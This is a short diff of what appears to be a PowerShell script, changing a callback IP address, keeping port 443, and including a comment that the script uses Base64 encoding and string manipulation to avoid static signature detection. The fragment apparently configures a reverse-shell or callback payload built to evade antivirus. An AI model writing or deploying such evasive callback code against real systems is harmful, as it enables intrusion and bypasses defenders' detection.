@@ -1,4 +1,4 @@
-$ip = '192.168.1.100'
+$ip = '10.211.55.5'
 $port = 443
 
 # Obfuscation: Using Base64 encoding and string manipulation to avoid static signature detection
